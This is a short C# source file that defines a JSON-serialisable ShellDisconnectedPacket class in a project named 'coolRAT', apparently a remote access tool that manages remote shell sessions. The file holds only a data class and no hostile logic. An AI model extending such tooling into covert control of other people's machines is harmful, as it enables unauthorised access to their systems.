using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Text;

namespace coolRAT.Libs.Packets
{
    public class ShellDisconnectedPacket : Packet
    {
        public Guid ClientUniqueId;
        public Guid ShellUniqueId;
        public bool Success;
        public ShellDisconnectedPacket(Guid clientUniqueId, Guid shellUniqueId, bool success)
        {
            Type = "ShellDisconnectedPacket";
            ClientUniqueId = clientUniqueId;
            ShellUniqueId = shellUniqueId;
            Success = success;
        }

        public static new ShellDisconnectedPacket Deserialize(string packet_string)
        {
            return JsonConvert.DeserializeObject<ShellDisconnectedPacket>(packet_string);
        }
    }
}
